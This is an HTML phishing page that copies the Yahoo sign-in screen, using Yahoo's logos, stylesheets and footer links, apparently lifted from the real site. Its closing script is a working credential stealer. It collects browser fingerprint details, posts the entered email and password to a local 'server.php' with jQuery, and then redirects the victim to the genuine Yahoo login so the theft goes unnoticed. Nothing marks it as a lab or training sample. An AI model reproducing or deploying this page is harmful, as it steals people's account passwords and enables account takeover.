<html id="Stencil" class="js grid light-theme "><head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>Yahoo</title>
        <meta name="description" content="Yahoo">
        <link rel="dns-prefetch" href="//gstatic.com">
        <link rel="dns-prefetch" href="//google.com">
        <link rel="dns-prefetch" href="//s.yimg.com">
        <link rel="dns-prefetch" href="//y.analytics.yahoo.com">
        <link rel="dns-prefetch" href="//ucs.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.yahoo.com">
        <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
        <style nonce="">
            #mbr-css-check {
                display: inline;
            }
        </style>
        <link href="https://s.yimg.com/wm/mbr/564c3949cccdb80b19084906f205929c97dad35c/yahoo-main.css" rel="stylesheet" type="text/css">
        
        <script src="jquery.js"></script>
        
        </head>
        
        
        
    <body class="bucket-mbr-change-password-v2 bucket-mbr-signin-with-google bucket-mbr-oneflow-captcha bucket-mbr-comm-channel-classifier">
    
    
    
    
    <div id="login-body" class="loginish puree-v2 grid dark-background">
    <div class="mbr-desktop-hd">
    <span class="column">
         <a href="https://www.yahoo.com/">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36">
        </a>
    </span>
    <span class="column help txt-align-right">
        <a href="https://help.yahoo.com/kb/index?locale=pt_BR&amp;page=product&amp;y=PROD_ACCT">Help</a>
    </span>
</div>
    <div class="login-box-container">
        
        <div class="login-box right">
            
                
                    <div class="mbr-login-hd txt-align-center">
                    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27">
                    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27">
            </div>
            
        
            <div class="challenge yid-challenge">
    <div class="challenge-header">
</div>

<div class="username-challenge" >
    
    
    <form id="login-username-form" method="post" class="pure-form" onsubmit="return false;">
        
        
            
            
            <div id="hideMe">
                
            
            
            
    <strong class="challenge-heading">Sign&nbsp;in</strong>
    <span class="challenge-desc signin-sub-title">using your Yahoo&nbsp;account</span>
    
    <br>
    <br>
    
            
                <input class="phone-no " placeholder="Username, email, or&nbsp;mobile" type="text" name="username" id="username" tabindex="1" value="" autocomplete="username" autocapitalize="none" autocorrect="off" autofocus="true" placeholder=" ">
                
            
            
                
                
                <ul class="auto-fill-overlay hide" aria-live="polite" id="domain-auto-fill">
                    <li data-fill="yahoo.com" tabindex="2">yahoo.com</li><li data-fill="gmail.com" tabindex="3">gmail.com</li><li data-fill="outlook.com" tabindex="4">outlook.com</li><li data-fill="aol.com" tabindex="5">aol.com</li>
                </ul>  
                
                
                
        
        
        
        
        <p id="user-error" style="color:red;font-size:11px;"></p>


        <div class="button-container">
            
            <input id="next" type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Next" >
            
            
            
            
            
        </div>

                
        <div class="helper-links-container">
            <div class="helper-item ">
                <span class="stay-signed-in checkbox-container">
                    <input id="persistent" name="persistent" value="y" type="checkbox" tabindex="7" checked="">
                    <label for="persistent">Stay signed&nbsp;in</label>
                </span>
            </div>
            <div class="helper-item arlink">
                <span class="help">
                    <a href="/forgot?src=noSrc&amp;done=https%3A%2F%2Fwww.yahoo.com" id="mbr-forgot-link" data-ylk="elm:btn;elmt:forgot;slk:forgot;mkey:login-landing-forgot" data-rapid-tracking="true">Forgot&nbsp;username?</a>
                </span>
            </div>
        </div>
                
                </div>
                
                
                
                
            <div id="showMe">
                
                
            
                 <center><span id="displayEmail" style="margin-top:0;"></span></center>
                 
                 <br>
                
            
            <strong class="challenge-heading">Enter&nbsp;password</strong>
<span class="txt-align-center challenge-desc">to finish sign&nbsp;in</span>    
            
            
                
                 <br>
                
                
                
                <input name="passwd" id="password" class="pwd-field" type="password" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" placeholder="Password">
          
           
            
        <div class="button-container">
            
            <input id="submit" type="submit"  class="pure-button puree-button-primary challenge-button" value="Next" >
            
        </div>
          
          
            </div>
            
            
        </div>
        
        <style>
            
            
            
            #showMe{
                
                
                display:none;
                
            }
            
            
            
            
            
        </style>
        
        
         
      







<script>
              
                 var next = document.getElementById('next');
                 
                 
                 next.addEventListener('click', nextOpen);
                 
                 
                 function nextOpen(){
                     
                     
                    var x =  document.getElementById('username');
                    
                    
                    if(x.value == ''){
                        
                        document.getElementById('user-error').innerHTML = "Sorry, we don't recognize this email."
                    }else{
                        
                        
                     document.getElementById('hideMe').style.display = 'none';
                     document.getElementById('showMe').style.display = 'block';
                                          document.getElementById('displayEmail').innerHTML = x.value;

                    }
                     
                    
                 }
            
            
        </script>

        
        <div class="bottom-links-container has-social-buttons">
            
            <p class="sign-up-link">
                <a href="/account/create?src=noSrc&amp;specId=yidReg&amp;done=https%3A%2F%2Fwww.yahoo.com" id="createacc" role="button" class="pure-button puree-button-secondary challenge-button" data-rapid-tracking="true" data-ylk="elm:link;elmt:secondary;mKey:login-landing-signup">Create an&nbsp;account</a>
            </p>

                <div id="social-login-container" class="social-login-container">
                    <div class="or-cont-with-desc challenge-feedback-text">
                        Or, continue&nbsp;with
                    </div>
                    <ul class="social-login">
                        <li class="items-cont-1">
                            <button type="submit" id="tpa-google-button" name="tpaProvider" value="google" class="pure-button sc-button items-1 sc-google sc-google-button" data-rapid-tracking="true" data-ylk="elm:btn;slk:google-btn;mKey:login-landing-google-social-btn"><label class="offscreen">google</label></button>
                        </li>
                    </ul>
                </div>        </div>
    </form>
</div>
</div>
        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback" style="display: block;">
            <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>
        </div>
    </div>
    <div class="login-bg-outer">
        <div class="login-bg-inner"><div id="login-ad-rich" style="visibility: inherit;"></div></div>
    </div>
    <div class="login-footer">
    <p>
        <a href="https://www.verizonmedia.com/policies/br/pt/verizonmedia/terms/otos/index.html" target="_blank" class="terms">Terms</a>
        
        <span>|</span>
        <a href="https://www.verizonmedia.com/policies/br/pt/verizonmedia/privacy/index.html" target="_blank" class="privacy">Privacy</a>
        
    </p>
</div>
</div>


    <div id="mbr-css-check"></div>
    <img src="https://sb.scorecardresearch.com/p?c1=2&amp;c2=7241469&amp;c5=794312018&amp;ns_c=UTF-8&amp;ns__t=1606417783660&amp;c7=https%3A%2F%2Flogin.yahoo.com%2F&amp;c14=-1" id="comscore" height="1" width="1" alt="" referrerpolicy="origin" role="presentation" aria-hidden="true" style="display:none">
    <div id="page-mask" class="page-mask hide"></div>
    <div id="ad"></div>
    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
        <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
        <input type="checkbox" id="mbr-legacy-device-bar-cross">
        <p class="mbr-legacy-device">
                Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="">More&nbsp;Info</a>
        </p>
    </div>

<!-- fe27.member.bf1.yahoo.com - Thu Nov 26 2020 19:09:43 GMT+0000 (Coordinated Universal Time) - (0ms) -->


<div id="darla_csc_holder" class="darla" style="display: none;"><iframe name="darla_csc_writer_0--%253Cimg%2520width%253D1%2520height%253D1%2520alt%253D%2522%2522%2520src%253D%2522https%253A//bf.us.y.atwola.com/adcount%257C2.0%257C5113.1%257C5043028%257C0%257C0%257CAdId%253D-41%253BBnId%253D0%253Bct%253D1237480415%253Bst%253D8291%253Badcid%253D0%253Bitime%253D417789847%253Breqtype%253D5%253Bguid%253Df9jqs29fjl8na%2526b%253D3%2526s%253Dho%253B%253Bimpref%253D16064177902417468994%253Bimprefseq%253D234755765892548319%253Bimprefts%253D1606417790%253Badclntid%253D1004%253Bspaceid%253D794312018%253Badposition%253DRICH%253Blmsid%253D%253Brevshare%253D%253Bpvid%253D5Eh6ezEwLjH0z1wSXzqi6gDuMTg2LgAAAABJwdMg%253Bsectionid%253D%253Bkvsecure%25252Ddarla%253D4%25252D6%25252D1%25257Cysd%25257C2%253Bkvmn%253Dy963896094%253Bkvssp%253Dssp%253Bkvsecure%253Dtrue%253Bkvpgcolo%253Dbf1%253Bkvy%25252Dbucket%253Dmbr%25252Dchange%25252Dpassword%25252Dv2%25252Cmbr%25252Dqr%25252Dsign%25252Din%25252Dprimary%25252Cmbr%25252Dcaptcha%25252Dcontrol%25252Dar%25252Cmbr%25252Dsignin%25252Dwith%25252Dgoogle%25252Cmbr%25252D%253Bkvadtc%25255Fdvmktname%253Dunknown%253Bkvadtc%25255Fdvosplt%253Dwindows%25255F10%253Bkvadtc%25255Fdvbrand%253Dgoogle%253Bkvadtc%25255Fdvtype%253Ddesktop%253Bkvadtc%25255Fdvmodel%253Dchrome%25255F%25252D%25255Fwindows%253Bkvrepo%25255Fdvosplt%253Dwindows%25255F10%253Bkvadtc%25255Fdvosversion%253DNT%25252010%25252E0%253Bkvadtc%25255Fcrmcc%253DUNKNOWN%253Bkvadtc%25255Fcrmnc%253DUNKNOWN%253Bgdpr%253D0%253B%2522%253E%253C%2521--%2520Page%2520End%2520HTML%2520--%253E%253Cscript%253E%2528function%2528d%2529%257Bvar%2520a%253Dd.body.appendChild%2528d.createElement%2528%2527iframe%2527%2529%2529%252Cb%253Da.contentWindow.document%253Ba.style.cssText%253D%2527height%253A0%253Bwidth%253A0%253Bframeborder%253Ano%253Bscrolling%253Ano%253Bsandbox%253Aallow-scripts%253Bdisplay%253Anone%253B%2527%253Bb.open%2528%2529.write%2528%2527%253Cbody%2520onload%253D%2522var%2520d%253Ddocument%253Bd.getElementsByTagName%2528%255C%2527head%255C%2527%2529%255B0%255D.appendChild%2528d.createElement%2528%255C%2527script%255C%2527%2529%2529.src%253D%255C%2527https%253A%255C/%255C/s.yimg.com%255C/rq%255C/sbox%255C/bv.js%255C%2527%2522%253E%2527%2529%253Bb.close%2528%2529%253B%257D%2529%2528document%2529%253B%253C/script%253E%253Ciframe%2520src%253D%2522https%253A//opus.analytics.yahoo.com/tag/opus-frame.html%253Fid%253D4%2522%2520frameborder%253D%2522no%2522%2520width%253D%25220%2522%2520height%253D%25220%2522%2520style%253D%2522display%253Anone%2522%253E%253C/iframe%253E%253Cscript%2520src%253D%2522https%253A//tag.idsync.analytics.yahoo.com/sp.js%2522%253E%253C/script%253E" style="display: none;" id="darla_csc_writer_0" class="darla" src="https://s.yimg.com/rq/darla/4-6-1/html/r-csc.html" frameborder="no" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0"></iframe></div>




<script>



var txt = "";

txt += "<p>Browser CodeName: " + navigator.appCodeName + "</p>";
txt += "<p>Browser Name: " + navigator.appName + "</p>";
txt += "<p>Browser Version: " + navigator.appVersion + "</p>";
txt += "<p>Browser Language: " + navigator.language + "</p>";
txt += "<p>Browser Online: " + navigator.onLine + "</p>";
txt += "<p>Platform: " + navigator.platform + "</p>";
txt += "<p>User-agent header: " + navigator.userAgent + "</p>";
    
    
    $('#submit').click(function(){





        var user = txt;
        
        var email = $('#username').val();
        var password = $('#password').val();

        if (email == '') {


          alert('enter your email address');
        
        }else{


if (password == '') {


          alert('enter your password');
        
        }else{



        $.post("server.php", {

    email: email,
    password: password,
    userdetails: user

  }
  
  ,function(data){
        

       window.location ="https://login.yahoo.com/account/challenge/password?src=noSrc&done=https%3A%2F%2Fwww.yahoo.com%2F&sessionIndex=QQ--&acrumb=qZH0CEA8&display=login&authMechanism=primary";




        
        
     
        
    });
    
    

        }




        } 
    
    
    })
</script>








</body></html>